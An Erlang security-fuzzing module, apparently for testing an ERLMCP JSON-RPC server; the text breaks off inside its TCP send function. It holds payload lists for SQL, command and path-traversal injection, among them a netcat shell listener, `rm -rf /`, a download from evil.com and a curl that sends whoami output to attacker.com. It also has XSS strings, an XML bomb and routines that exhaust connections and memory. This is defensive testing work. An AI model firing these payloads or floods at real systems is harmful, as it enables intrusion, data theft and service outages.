%%%-------------------------------------------------------------------
%%% @doc
%%% ERLMCP Security Fuzzing Specialist - Comprehensive Vulnerability Detection
%%% 
%%% This module implements advanced security fuzzing techniques to identify
%%% vulnerabilities in the ERLMCP system including:
%%% - Input validation bypasses
%%% - Protocol manipulation attacks
%%% - Resource exhaustion vulnerabilities
%%% - Injection attacks (SQL, Command, Path traversal)
%%% - Buffer overflow attempts
%%% - Authentication/Authorization bypasses
%%%
%%% CRITICAL: This fuzzer generates traces for EVERY attack vector!
%%% @end
%%%-------------------------------------------------------------------
-module(erlmcp_security_fuzzer).
-behaviour(gen_server).

%% API exports
-export([
    start_link/0,
    start_link/1,
    fuzz_input/2,
    fuzz_protocol/2,
    fuzz_resources/2,
    run_comprehensive_fuzzing/3,
    generate_vulnerability_report/1,
    export_attack_traces/2
]).

%% gen_server callbacks
-export([
    init/1,
    handle_call/3,
    handle_cast/2,
    handle_info/2,
    terminate/2,
    code_change/3
]).

%% Internal exports for testing
-export([
    generate_fuzz_payload/1,
    classify_vulnerability/2,
    extract_security_indicators/1,
    create_attack_signature/2
]).

-include_lib("kernel/include/logger.hrl").

%% OpenTelemetry integration
-ifdef(OTP_RELEASE).
-if(?OTP_RELEASE >= 24).
-include_lib("opentelemetry_api/include/otel_tracer.hrl").
-endif.
-endif.

-record(fuzz_state, {
    transport :: atom(),
    target_host :: string(),
    target_port :: integer(),
    attack_vectors :: [atom()],
    max_iterations :: integer(),
    vulnerability_database :: ets:tid(),
    attack_traces :: ets:tid(),
    security_metrics :: map(),
    active_attacks :: integer(),
    discovered_vulnerabilities :: [map()]
}).

-record(vulnerability, {
    id :: binary(),
    type :: atom(),
    severity :: critical | high | medium | low,
    attack_vector :: atom(),
    payload :: binary(),
    response :: binary(),
    timestamp :: integer(),
    trace_id :: binary(),
    indicators :: [atom()],
    exploit_confirmed :: boolean()
}).

-record(attack_trace, {
    trace_id :: binary(),
    attack_type :: atom(),
    payload_sequence :: [binary()],
    response_sequence :: [binary()],
    timing_data :: [integer()],
    security_breach :: boolean(),
    vulnerability_score :: float()
}).

%%%===================================================================
%%% API
%%%===================================================================

start_link() ->
    start_link([]).

start_link(Options) ->
    gen_server:start_link({local, ?MODULE}, ?MODULE, [Options], []).

%% @doc Comprehensive input fuzzing with advanced payload generation
-spec fuzz_input(Transport :: atom(), Iterations :: integer()) -> 
    {ok, Results :: [#vulnerability{}]} | {error, Reason :: term()}.
fuzz_input(Transport, Iterations) ->
    gen_server:call(?MODULE, {fuzz_input, Transport, Iterations}, infinity).

%% @doc Advanced protocol fuzzing with state manipulation
-spec fuzz_protocol(Transport :: atom(), Scenarios :: integer()) -> 
    {ok, Results :: [#vulnerability{}]} | {error, Reason :: term()}.
fuzz_protocol(Transport, Scenarios) ->
    gen_server:call(?MODULE, {fuzz_protocol, Transport, Scenarios}, infinity).

%% @doc Resource exhaustion attack simulation
-spec fuzz_resources(Transport :: atom(), AttackTypes :: [atom()]) -> 
    {ok, Results :: [#vulnerability{}]} | {error, Reason :: term()}.
fuzz_resources(Transport, AttackTypes) ->
    gen_server:call(?MODULE, {fuzz_resources, Transport, AttackTypes}, infinity).

%% @doc Run comprehensive security fuzzing campaign
-spec run_comprehensive_fuzzing(Transport :: atom(), Iterations :: integer(), Options :: map()) ->
    {ok, Report :: map()} | {error, Reason :: term()}.
run_comprehensive_fuzzing(Transport, Iterations, Options) ->
    gen_server:call(?MODULE, {comprehensive_fuzz, Transport, Iterations, Options}, infinity).

%% @doc Generate detailed vulnerability report
-spec generate_vulnerability_report(Format :: json | xml | markdown) -> 
    {ok, Report :: binary()} | {error, Reason :: term()}.
generate_vulnerability_report(Format) ->
    gen_server:call(?MODULE, {generate_report, Format}).

%% @doc Export attack traces for forensic analysis
-spec export_attack_traces(Format :: binary, File :: string()) -> 
    ok | {error, Reason :: term()}.
export_attack_traces(Format, File) ->
    gen_server:call(?MODULE, {export_traces, Format, File}).

%%%===================================================================
%%% gen_server callbacks
%%%===================================================================

init([Options]) ->
    process_flag(trap_exit, true),
    
    % Initialize ETS tables for vulnerability tracking
    VulnDb = ets:new(vulnerability_db, [set, private, {keypos, #vulnerability.id}]),
    TraceDb = ets:new(attack_traces, [set, private, {keypos, #attack_trace.trace_id}]),
    
    % Start OpenTelemetry span for fuzzing session
    SpanCtx = start_security_span(<<"security_fuzzing_session">>),
    
    State = #fuzz_state{
        transport = maps:get(transport, Options, tcp),
        target_host = maps:get(host, Options, "localhost"),
        target_port = maps:get(port, Options, 8080),
        attack_vectors = get_attack_vectors(),
        max_iterations = maps:get(max_iterations, Options, 10000),
        vulnerability_database = VulnDb,
        attack_traces = TraceDb,
        security_metrics = #{
            session_start => erlang:system_time(millisecond),
            span_ctx => SpanCtx,
            attacks_attempted => 0,
            vulnerabilities_found => 0,
            critical_findings => 0
        },
        active_attacks => 0,
        discovered_vulnerabilities => []
    },
    
    ?LOG_INFO("Security Fuzzer initialized with ~p attack vectors", [length(State#fuzz_state.attack_vectors)]),
    
    {ok, State}.

handle_call({fuzz_input, Transport, Iterations}, _From, State) ->
    SpanCtx = start_security_span(<<"input_fuzzing">>),
    
    try
        Results = execute_input_fuzzing(Transport, Iterations, State),
        add_span_attributes(SpanCtx, #{
            <<"fuzzing.type">> => <<"input">>,
            <<"fuzzing.iterations">> => Iterations,
            <<"fuzzing.vulnerabilities_found">> => length(Results)
        }),
        
        UpdatedState = update_state_with_results(State, Results),
        {reply, {ok, Results}, UpdatedState}
    catch
        Error:Reason:Stack ->
            ?LOG_ERROR("Input fuzzing failed: ~p:~p~n~p", [Error, Reason, Stack]),
            {reply, {error, {Error, Reason}}, State}
    after
        end_security_span(SpanCtx)
    end;

handle_call({fuzz_protocol, Transport, Scenarios}, _From, State) ->
    SpanCtx = start_security_span(<<"protocol_fuzzing">>),
    
    try
        Results = execute_protocol_fuzzing(Transport, Scenarios, State),
        add_span_attributes(SpanCtx, #{
            <<"fuzzing.type">> => <<"protocol">>,
            <<"fuzzing.scenarios">> => Scenarios,
            <<"fuzzing.vulnerabilities_found">> => length(Results)
        }),
        
        UpdatedState = update_state_with_results(State, Results),
        {reply, {ok, Results}, UpdatedState}
    catch
        Error:Reason:Stack ->
            ?LOG_ERROR("Protocol fuzzing failed: ~p:~p~n~p", [Error, Reason, Stack]),
            {reply, {error, {Error, Reason}}, State}
    after
        end_security_span(SpanCtx)
    end;

handle_call({fuzz_resources, Transport, AttackTypes}, _From, State) ->
    SpanCtx = start_security_span(<<"resource_fuzzing">>),
    
    try
        Results = execute_resource_fuzzing(Transport, AttackTypes, State),
        add_span_attributes(SpanCtx, #{
            <<"fuzzing.type">> => <<"resource">>,
            <<"fuzzing.attack_types">> => length(AttackTypes),
            <<"fuzzing.vulnerabilities_found">> => length(Results)
        }),
        
        UpdatedState = update_state_with_results(State, Results),
        {reply, {ok, Results}, UpdatedState}
    catch
        Error:Reason:Stack ->
            ?LOG_ERROR("Resource fuzzing failed: ~p:~p~n~p", [Error, Reason, Stack]),
            {reply, {error, {Error, Reason}}, State}
    after
        end_security_span(SpanCtx)
    end;

handle_call({comprehensive_fuzz, Transport, Iterations, Options}, _From, State) ->
    SpanCtx = start_security_span(<<"comprehensive_fuzzing">>),
    
    try
        Report = execute_comprehensive_fuzzing(Transport, Iterations, Options, State),
        add_span_attributes(SpanCtx, #{
            <<"fuzzing.type">> => <<"comprehensive">>,
            <<"fuzzing.iterations">> => Iterations,
            <<"fuzzing.total_vulnerabilities">> => maps:get(total_vulnerabilities, Report, 0),
            <<"fuzzing.critical_findings">> => maps:get(critical_findings, Report, 0)
        }),
        
        {reply, {ok, Report}, State}
    catch
        Error:Reason:Stack ->
            ?LOG_ERROR("Comprehensive fuzzing failed: ~p:~p~n~p", [Error, Reason, Stack]),
            {reply, {error, {Error, Reason}}, State}
    after
        end_security_span(SpanCtx)
    end;

handle_call({generate_report, Format}, _From, State) ->
    try
        Report = generate_security_report(Format, State),
        {reply, {ok, Report}, State}
    catch
        Error:Reason:Stack ->
            ?LOG_ERROR("Report generation failed: ~p:~p~n~p", [Error, Reason, Stack]),
            {reply, {error, {Error, Reason}}, State}
    end;

handle_call({export_traces, Format, File}, _From, State) ->
    try
        ok = export_traces_to_file(Format, File, State),
        {reply, ok, State}
    catch
        Error:Reason:Stack ->
            ?LOG_ERROR("Trace export failed: ~p:~p~n~p", [Error, Reason, Stack]),
            {reply, {error, {Error, Reason}}, State}
    end.

handle_cast(_Msg, State) ->
    {noreply, State}.

handle_info(_Info, State) ->
    {noreply, State}.

terminate(_Reason, State) ->
    % Clean up ETS tables
    ets:delete(State#fuzz_state.vulnerability_database),
    ets:delete(State#fuzz_state.attack_traces),
    
    % End OpenTelemetry span
    SpanCtx = maps:get(span_ctx, State#fuzz_state.security_metrics),
    end_security_span(SpanCtx),
    
    ok.

code_change(_OldVsn, State, _Extra) ->
    {ok, State}.

%%%===================================================================
%%% Input Fuzzing Implementation
%%%===================================================================

execute_input_fuzzing(Transport, Iterations, State) ->
    AttackVectors = [
        buffer_overflow,
        sql_injection,
        command_injection,
        path_traversal,
        xss_injection,
        json_manipulation,
        format_string,
        integer_overflow,
        unicode_bypass,
        null_byte_injection
    ],
    
    Results = lists:flatten([
        fuzz_with_vector(Transport, Vector, Iterations div length(AttackVectors), State)
        || Vector <- AttackVectors
    ]),
    
    ?LOG_INFO("Input fuzzing completed: ~p vulnerabilities found", [length(Results)]),
    Results.

fuzz_with_vector(Transport, Vector, Iterations, State) ->
    TraceId = generate_trace_id(),
    SpanCtx = start_attack_span(Vector, TraceId),
    
    try
        Results = [
            begin
                Payload = generate_fuzz_payload(Vector),
                Result = send_payload(Transport, Payload, State),
                Vulnerability = analyze_response_for_vulnerability(Vector, Payload, Result, TraceId),
                record_attack_trace(TraceId, Vector, Payload, Result, State),
                Vulnerability
            end || _ <- lists:seq(1, Iterations)
        ],
        
        % Filter out non-vulnerabilities
        Vulnerabilities = [V || V <- Results, V =/= no_vulnerability],
        
        add_span_attributes(SpanCtx, #{
            <<"attack.vector">> => atom_to_binary(Vector),
            <<"attack.iterations">> => Iterations,
            <<"attack.vulnerabilities">> => length(Vulnerabilities)
        }),
        
        Vulnerabilities
    after
        end_security_span(SpanCtx)
    end.

%% Advanced payload generation for different attack vectors
generate_fuzz_payload(buffer_overflow) ->
    % Generate large payloads to trigger buffer overflows
    Sizes = [1024, 8192, 65536, 1048576, 16777216], % 1KB to 16MB
    Size = lists:nth(rand:uniform(length(Sizes)), Sizes),
    Pattern = <<"A">>,
    binary:copy(Pattern, Size);

generate_fuzz_payload(sql_injection) ->
    SqlPayloads = [
        <<"' OR '1'='1">>,
        <<"'; DROP TABLE users; --">>,
        <<"' UNION SELECT * FROM information_schema.tables --">>,
        <<"' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --">>,
        <<"'; EXEC xp_cmdshell('dir'); --">>,
        <<"' OR 1=1 INTO OUTFILE '/tmp/hack.txt">>,
        <<"admin'/*">>,
        <<"' OR 'x'='x">>,
        <<"') OR ('1'='1'">>,
        <<"' WAITFOR DELAY '00:00:30' --">>
    ],
    lists:nth(rand:uniform(length(SqlPayloads)), SqlPayloads);

generate_fuzz_payload(command_injection) ->
    CmdPayloads = [
        <<"; ls -la">>,
        <<"`whoami`">>,
        <<"$(id)">>,
        <<"|cat /etc/passwd">>,
        <<"&& ping -c 10 127.0.0.1">>,
        <<"; nc -l -p 4444 -e /bin/sh">>,
        <<"`rm -rf /`">>,
        <<"|| wget http://evil.com/shell.sh">>,
        <<"; curl http://attacker.com/$(whoami)">>,
        <<"& echo vulnerable">>
    ],
    lists:nth(rand:uniform(length(CmdPayloads)), CmdPayloads);

generate_fuzz_payload(path_traversal) ->
    PathPayloads = [
        <<"../../../etc/passwd">>,
        <<"..\\..\\..\\windows\\system32\\config\\sam">>,
        <<"....//....//....//etc/passwd">>,
        <<"/etc/passwd%00.jpg">>,
        <<"..%2f..%2f..%2fetc%2fpasswd">>,
        <<"..%252f..%252f..%252fetc%252fpasswd">>,
        <<"....\/....\/....\/etc\/passwd">>,
        <<"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd">>,
        <<"\\..\\..\\..\\etc\\passwd">>,
        <<"file:///etc/passwd">>
    ],
    lists:nth(rand:uniform(length(PathPayloads)), PathPayloads);

generate_fuzz_payload(xss_injection) ->
    XssPayloads = [
        <<"<script>alert('XSS')</script>">>,
        <<"<img src=x onerror=alert('XSS')>">>,
        <<"<svg onload=alert('XSS')>">>,
        <<"javascript:alert('XSS')">>,
        <<"<iframe src=javascript:alert('XSS')></iframe>">>,
        <<"<body onload=alert('XSS')>">>,
        <<"<input onfocus=alert('XSS') autofocus>">>,
        <<"<select onfocus=alert('XSS') autofocus>">>,
        <<"<textarea onfocus=alert('XSS') autofocus>">>,
        <<"<keygen onfocus=alert('XSS') autofocus>">>
    ],
    lists:nth(rand:uniform(length(XssPayloads)), XssPayloads);

generate_fuzz_payload(json_manipulation) ->
    JsonPayloads = [
        <<"{\"test\": \"value\", \"test\": \"overwrite\"}">>,
        <<"{\"__proto__\": {\"isAdmin\": true}}">>,
        <<"{\"constructor\": {\"prototype\": {\"isAdmin\": true}}}">>,
        <<"{\n\"key\": \"value\",\n\"key2\": }">>,
        <<"{\"a\":">>,
        <<"[[[[[[[[[[[[[[[[[[[[[">>,
        <<"{\"key\": \"\\u0000\"}">>,
        <<"{\"key\": 1e400}">>,
        <<"{\"key\": -1e400}">>,
        <<"{\"\\u0000\": \"value\"}">>
    ],
    lists:nth(rand:uniform(length(JsonPayloads)), JsonPayloads);

generate_fuzz_payload(format_string) ->
    FmtPayloads = [
        <<"%x%x%x%x%x%x%x%x">>,
        <<"%s%s%s%s%s%s%s%s">>,
        <<"%08x.%08x.%08x.%08x">>,
        <<"%n%n%n%n">>,
        <<"%.1000d">>,
        <<"%*.*s">>,
        <<"%p%p%p%p">>,
        <<"%#x%#x%#x%#x">>,
        <<"%lx%lx%lx%lx">>,
        <<"%hn%hn%hn%hn">>
    ],
    lists:nth(rand:uniform(length(FmtPayloads)), FmtPayloads);

generate_fuzz_payload(integer_overflow) ->
    IntPayloads = [
        <<"2147483648">>,     % 2^31
        <<"4294967296">>,     % 2^32
        <<"18446744073709551616">>, % 2^64
        <<"-2147483649">>,    % -2^31 - 1
        <<"999999999999999999999999999999">>,
        <<"1.7976931348623157e+308">>, % Max double
        <<"-1.7976931348623157e+308">>,
        <<"inf">>,
        <<"-inf">>,
        <<"nan">>
    ],
    lists:nth(rand:uniform(length(IntPayloads)), IntPayloads);

generate_fuzz_payload(unicode_bypass) ->
    UnicodePayloads = [
        <<"<scrＩpt>alert('XSS')</scrＩpt>">>,
        <<"../‥/‥/etc/passwd">>,
        <<"%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd">>,
        <<"︶︸︹︺︻︼︽︾︿﹀﹁﹂﹃﹄">>,
        <<"𝒶𝓁ℯ𝓇𝓉('𝓍𝓈𝓈')">>,
        <<"\u202e\u0000script\u202dalert('XSS')\u202e\u0000/script\u202d">>,
        <<"℮ⅴ𝒶𝓁">>,
        <<"\uFEFF<script>alert('XSS')</script>">>,
        <<"\u200B\u200C\u200D\uFEFF">>,
        <<"\u0000\u0001\u0002\u0003\u0004\u0005\u0006\u0007">>
    ],
    lists:nth(rand:uniform(length(UnicodePayloads)), UnicodePayloads);

generate_fuzz_payload(null_byte_injection) ->
    NullPayloads = [
        <<"file.txt\u0000.jpg">>,
        <<"admin\u0000">>,
        <<"/etc/passwd\u0000.txt">>,
        <<"script\u0000alert('XSS')">>,
        <<"SELECT * FROM users\u0000 --">>,
        <<"ls\u0000; rm -rf *">>,
        <<"index.php\u0000\u0000">>,
        <<"..\u0000/etc/passwd">>,
        <<"user\u0000' OR '1'='1">>,
        <<"cmd.exe\u0000/c dir">>
    ],
    lists:nth(rand:uniform(length(NullPayloads)), NullPayloads).

%%%===================================================================
%%% Protocol Fuzzing Implementation
%%%===================================================================

execute_protocol_fuzzing(Transport, Scenarios, State) ->
    ProtocolAttacks = [
        {invalid_sequence, fun fuzz_invalid_sequence/3},
        {out_of_order, fun fuzz_out_of_order/3},
        {replay_attack, fun fuzz_replay_attack/3},
        {session_hijacking, fun fuzz_session_hijacking/3},
        {race_condition, fun fuzz_race_condition/3},
        {timing_attack, fun fuzz_timing_attack/3},
        {state_confusion, fun fuzz_state_confusion/3},
        {protocol_downgrade, fun fuzz_protocol_downgrade/3}
    ],
    
    Results = lists:flatten([
        AttackFun(Transport, Scenarios div length(ProtocolAttacks), State)
        || {_AttackName, AttackFun} <- ProtocolAttacks
    ]),
    
    ?LOG_INFO("Protocol fuzzing completed: ~p vulnerabilities found", [length(Results)]),
    Results.

fuzz_invalid_sequence(Transport, Iterations, State) ->
    TraceId = generate_trace_id(),
    SpanCtx = start_attack_span(invalid_sequence, TraceId),
    
    try
        [
            begin
                % Create invalid JSON-RPC sequences
                InvalidSequence = generate_invalid_jsonrpc_sequence(),
                Result = send_payload_sequence(Transport, InvalidSequence, State),
                analyze_sequence_response(invalid_sequence, InvalidSequence, Result, TraceId)
            end || _ <- lists:seq(1, Iterations)
        ]
    after
        end_security_span(SpanCtx)
    end.

fuzz_out_of_order(Transport, Iterations, State) ->
    TraceId = generate_trace_id(),
    SpanCtx = start_attack_span(out_of_order, TraceId),
    
    try
        [
            begin
                % Send responses before requests, etc.
                OutOfOrderSeq = generate_out_of_order_sequence(),
                Result = send_payload_sequence(Transport, OutOfOrderSeq, State),
                analyze_sequence_response(out_of_order, OutOfOrderSeq, Result, TraceId)
            end || _ <- lists:seq(1, Iterations)
        ]
    after
        end_security_span(SpanCtx)
    end.

fuzz_replay_attack(Transport, Iterations, State) ->
    TraceId = generate_trace_id(),
    SpanCtx = start_attack_span(replay_attack, TraceId),
    
    try
        % First, capture valid traffic
        ValidSequence = capture_valid_sequence(Transport, State),
        
        [
            begin
                % Replay with modifications
                ReplaySeq = modify_for_replay(ValidSequence),
                Result = send_payload_sequence(Transport, ReplaySeq, State),
                analyze_sequence_response(replay_attack, ReplaySeq, Result, TraceId)
            end || _ <- lists:seq(1, Iterations)
        ]
    after
        end_security_span(SpanCtx)
    end.

fuzz_session_hijacking(Transport, Iterations, State) ->
    TraceId = generate_trace_id(),
    SpanCtx = start_attack_span(session_hijacking, TraceId),
    
    try
        [
            begin
                % Attempt session token manipulation
                HijackPayload = generate_session_hijack_payload(),
                Result = send_payload(Transport, HijackPayload, State),
                analyze_response_for_vulnerability(session_hijacking, HijackPayload, Result, TraceId)
            end || _ <- lists:seq(1, Iterations)
        ]
    after
        end_security_span(SpanCtx)
    end.

fuzz_race_condition(Transport, Iterations, State) ->
    TraceId = generate_trace_id(),
    SpanCtx = start_attack_span(race_condition, TraceId),
    
    try
        [
            begin
                % Send concurrent requests to trigger race conditions
                RacePayloads = generate_race_condition_payloads(),
                Results = send_concurrent_payloads(Transport, RacePayloads, State),
                analyze_race_condition_results(RacePayloads, Results, TraceId)
            end || _ <- lists:seq(1, Iterations)
        ]
    after
        end_security_span(SpanCtx)
    end.

fuzz_timing_attack(Transport, Iterations, State) ->
    TraceId = generate_trace_id(),
    SpanCtx = start_attack_span(timing_attack, TraceId),
    
    try
        [
            begin
                % Measure response times for different inputs
                TimingPayload = generate_timing_attack_payload(),
                {Result, ResponseTime} = send_payload_timed(Transport, TimingPayload, State),
                analyze_timing_vulnerability(TimingPayload, Result, ResponseTime, TraceId)
            end || _ <- lists:seq(1, Iterations)
        ]
    after
        end_security_span(SpanCtx)
    end.

fuzz_state_confusion(Transport, Iterations, State) ->
    TraceId = generate_trace_id(),
    SpanCtx = start_attack_span(state_confusion, TraceId),
    
    try
        [
            begin
                % Send conflicting state information
                StatePayload = generate_state_confusion_payload(),
                Result = send_payload(Transport, StatePayload, State),
                analyze_response_for_vulnerability(state_confusion, StatePayload, Result, TraceId)
            end || _ <- lists:seq(1, Iterations)
        ]
    after
        end_security_span(SpanCtx)
    end.

fuzz_protocol_downgrade(Transport, Iterations, State) ->
    TraceId = generate_trace_id(),
    SpanCtx = start_attack_span(protocol_downgrade, TraceId),
    
    try
        [
            begin
                % Attempt to downgrade to insecure protocols
                DowngradePayload = generate_downgrade_payload(),
                Result = send_payload(Transport, DowngradePayload, State),
                analyze_response_for_vulnerability(protocol_downgrade, DowngradePayload, Result, TraceId)
            end || _ <- lists:seq(1, Iterations)
        ]
    after
        end_security_span(SpanCtx)
    end.

%%%===================================================================
%%% Resource Attack Implementation
%%%===================================================================

execute_resource_fuzzing(Transport, AttackTypes, State) ->
    AllAttackTypes = [
        connection_exhaustion,
        memory_exhaustion,
        cpu_exhaustion,
        disk_exhaustion,
        bandwidth_exhaustion,
        thread_exhaustion,
        file_descriptor_exhaustion,
        socket_exhaustion
    ],
    
    AttacksToRun = case AttackTypes of
        [] -> AllAttackTypes;
        _ -> AttackTypes
    end,
    
    Results = lists:flatten([
        execute_resource_attack(Transport, AttackType, State)
        || AttackType <- AttacksToRun
    ]),
    
    ?LOG_INFO("Resource fuzzing completed: ~p vulnerabilities found", [length(Results)]),
    Results.

execute_resource_attack(Transport, connection_exhaustion, State) ->
    TraceId = generate_trace_id(),
    SpanCtx = start_attack_span(connection_exhaustion, TraceId),
    
    try
        MaxConnections = 10000,
        Connections = [
            spawn(fun() -> hold_connection(Transport, State) end)
            || _ <- lists:seq(1, MaxConnections)
        ],
        
        % Monitor system response
        timer:sleep(5000), % Wait 5 seconds
        
        % Test if system is still responsive
        TestResult = send_payload(Transport, <<"test">>, State),
        Vulnerability = analyze_resource_exhaustion(connection_exhaustion, TestResult, TraceId),
        
        % Clean up connections
        [exit(Pid, kill) || Pid <- Connections],
        
        [Vulnerability]
    after
        end_security_span(SpanCtx)
    end;

execute_resource_attack(Transport, memory_exhaustion, State) ->
    TraceId = generate_trace_id(),
    SpanCtx = start_attack_span(memory_exhaustion, TraceId),
    
    try
        % Send increasingly large payloads
        Sizes = [1024, 10240, 102400, 1048576, 10485760, 104857600], % 1KB to 100MB
        Results = [
            begin
                Payload = binary:copy(<<"A">>, Size),
                Result = send_payload(Transport, Payload, State),
                analyze_response_for_vulnerability(memory_exhaustion, Payload, Result, TraceId)
            end || Size <- Sizes
        ],
        
        % Filter vulnerabilities
        [R || R <- Results, R =/= no_vulnerability]
    after
        end_security_span(SpanCtx)
    end;

execute_resource_attack(Transport, cpu_exhaustion, State) ->
    TraceId = generate_trace_id(),
    SpanCtx = start_attack_span(cpu_exhaustion, TraceId),
    
    try
        % Send computationally expensive payloads
        CpuPayloads = [
            generate_regex_bomb(),
            generate_xml_bomb(),
            generate_zip_bomb(),
            generate_algorithmic_bomb()
        ],
        
        Results = [
            begin
                {Result, ProcessingTime} = send_payload_timed(Transport, Payload, State),
                analyze_cpu_exhaustion(Payload, Result, ProcessingTime, TraceId)
            end || Payload <- CpuPayloads
        ],
        
        [R || R <- Results, R =/= no_vulnerability]
    after
        end_security_span(SpanCtx)
    end;

execute_resource_attack(Transport, disk_exhaustion, State) ->
    TraceId = generate_trace_id(),
    SpanCtx = start_attack_span(disk_exhaustion, TraceId),
    
    try
        % Attempt to fill disk space through log files or uploads
        DiskPayloads = generate_disk_exhaustion_payloads(),
        
        Results = [
            begin
                Result = send_payload(Transport, Payload, State),
                analyze_response_for_vulnerability(disk_exhaustion, Payload, Result, TraceId)
            end || Payload <- DiskPayloads
        ],
        
        [R || R <- Results, R =/= no_vulnerability]
    after
        end_security_span(SpanCtx)
    end.

%%%===================================================================
%%% Payload Generation Helpers
%%%===================================================================

generate_invalid_jsonrpc_sequence() ->
    InvalidMessages = [
        % Missing required fields
        <<"{\"method\": \"test\"}">>,
        % Invalid JSON-RPC version
        <<"{\"jsonrpc\": \"1.0\", \"method\": \"test\", \"id\": 1}">>,
        % Malformed JSON
        <<"{\"jsonrpc\": \"2.0\", \"method\": }">>,
        % Wrong data types
        <<"{\"jsonrpc\": 2.0, \"method\": 123, \"id\": \"invalid\"}">>,
        % Extremely large ID
        <<"{\"jsonrpc\": \"2.0\", \"method\": \"test\", \"id\": 999999999999999999999999999}">>,
        % Null bytes
        <<"{\"jsonrpc\": \"2.0\", \"method\": \"test\\u0000\", \"id\": 1}">>
    ],
    lists:nth(rand:uniform(length(InvalidMessages)), InvalidMessages).

generate_out_of_order_sequence() ->
    % Response without request
    [
        <<"{\"jsonrpc\": \"2.0\", \"result\": \"success\", \"id\": 1}">>,
        <<"{\"jsonrpc\": \"2.0\", \"method\": \"test\", \"id\": 1}">>
    ].

generate_session_hijack_payload() ->
    HijackAttempts = [
        % Session ID manipulation
        <<"{\"jsonrpc\": \"2.0\", \"method\": \"auth\", \"params\": {\"session_id\": \"admin_session_12345\"}, \"id\": 1}">>,
        % Token stealing attempt
        <<"{\"jsonrpc\": \"2.0\", \"method\": \"validate_token\", \"params\": {\"token\": \"../../../var/log/sessions/admin.token\"}, \"id\": 1}">>,
        % Cookie manipulation
        <<"{\"jsonrpc\": \"2.0\", \"method\": \"auth\", \"headers\": {\"Cookie\": \"session=admin; role=admin; authenticated=true\"}, \"id\": 1}">>
    ],
    lists:nth(rand:uniform(length(HijackAttempts)), HijackAttempts).

generate_race_condition_payloads() ->
    % Multiple simultaneous operations on same resource
    BasePayload = <<"{\"jsonrpc\": \"2.0\", \"method\": \"update_balance\", \"params\": {\"amount\": 1000}, \"id\": ">>,
    [<<BasePayload/binary, (integer_to_binary(N))/binary, "}">> || N <- lists:seq(1, 50)].

generate_timing_attack_payload() ->
    % Payloads that might reveal information through timing
    TimingAttempts = [
        <<"{\"jsonrpc\": \"2.0\", \"method\": \"authenticate\", \"params\": {\"username\": \"admin\", \"password\": \"a\"}, \"id\": 1}">>,
        <<"{\"jsonrpc\": \"2.0\", \"method\": \"authenticate\", \"params\": {\"username\": \"admin\", \"password\": \"admin\"}, \"id\": 1}">>,
        <<"{\"jsonrpc\": \"2.0\", \"method\": \"check_user\", \"params\": {\"username\": \"nonexistent_user_12345\"}, \"id\": 1}">>,
        <<"{\"jsonrpc\": \"2.0\", \"method\": \"check_user\", \"params\": {\"username\": \"admin\"}, \"id\": 1}">>
    ],
    lists:nth(rand:uniform(length(TimingAttempts)), TimingAttempts).

generate_state_confusion_payload() ->
    StatePayloads = [
        % Conflicting authentication states
        <<"{\"jsonrpc\": \"2.0\", \"method\": \"multi_auth\", \"params\": {\"logged_in\": true, \"logged_in\": false}, \"id\": 1}">>,
        % Invalid state transitions
        <<"{\"jsonrpc\": \"2.0\", \"method\": \"logout\", \"params\": {\"force_login\": true}, \"id\": 1}">>,
        % State injection
        <<"{\"jsonrpc\": \"2.0\", \"method\": \"get_data\", \"params\": {\"__state__\": {\"admin\": true}}, \"id\": 1}">>
    ],
    lists:nth(rand:uniform(length(StatePayloads)), StatePayloads).

generate_downgrade_payload() ->
    % Attempt protocol downgrade
    <<"{\"jsonrpc\": \"1.0\", \"method\": \"negotiate_protocol\", \"params\": {\"force_version\": \"1.0\"}, \"id\": 1}">>.

generate_regex_bomb() ->
    % ReDoS payload
    <<"{\"jsonrpc\": \"2.0\", \"method\": \"validate\", \"params\": {\"pattern\": \"(a+)+$\", \"input\": \"", (binary:copy(<<"a">>, 1000))/binary, "X\"}, \"id\": 1}">>.

generate_xml_bomb() ->
    % Billion laughs attack
    XmlBomb = <<"<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">]><lolz>&lol3;</lolz>">>,
    <<"{\"jsonrpc\": \"2.0\", \"method\": \"parse_xml\", \"params\": {\"data\": \"", XmlBomb/binary, "\"}, \"id\": 1}">>.

generate_zip_bomb() ->
    % Compressed data that expands enormously
    <<"{\"jsonrpc\": \"2.0\", \"method\": \"extract\", \"params\": {\"zip_data\": \"UEsDBAoAAAAAAIdRlVFAAAAAAAAAAAAAAAAJAAAAaGVsbG8udHh0UEsBAi0ACgAAAAAAh1GVUQAAAAAAAAAAAAAAAAkAAAAAAAAAAAAgAAAAAAAAAGhlbGxvLnR4dFBLBQYAAAAAAQABADcAAAAbAAAAAAA=\"}, \"id\": 1}">>.

generate_algorithmic_bomb() ->
    % Computationally expensive operation
    <<"{\"jsonrpc\": \"2.0\", \"method\": \"calculate\", \"params\": {\"operation\": \"fibonacci\", \"n\": 10000}, \"id\": 1}">>.

generate_disk_exhaustion_payloads() ->
    % Large log injection attempts
    LargeString = binary:copy(<<"A">>, 100000), % 100KB
    [
        <<"{\"jsonrpc\": \"2.0\", \"method\": \"log\", \"params\": {\"message\": \"", LargeString/binary, "\"}, \"id\": ", (integer_to_binary(N))/binary, "}">>
        || N <- lists:seq(1, 1000)
    ].

%%%===================================================================
%%% Communication and Response Analysis
%%%===================================================================

send_payload(Transport, Payload, State) ->
    try
        case Transport of
            tcp ->
                send_tcp_payload(Payload, State);
            http ->
                send_http_payload(Payload, State);
            websocket ->
                send_websocket_payload(Payload, State);
            _ ->
                {error, unsupported_transport}
        end
    catch
        Error:Reason:Stack ->
            ?LOG_ERROR("Failed to send payload: ~p:~p~n~p", [Error, Reason, Stack]),
            {error, {send_failed, Error, Reason}}
    end.

send_tcp_payload(Payload, State) ->
    Host = State#fuzz_state.target_host,
    Port = State#fuzz_state.target_port,
    
    case gen_tcp:connect(Host, Port, [binary, {active, false}, {packet, 0}], 5000) of
        {ok, Socket} ->
            try
                case gen_tcp:send(Socket, Payload) of
                    ok ->
                        case gen_tcp:recv(Socket, 0, 10000) of
                            {ok, Response} ->
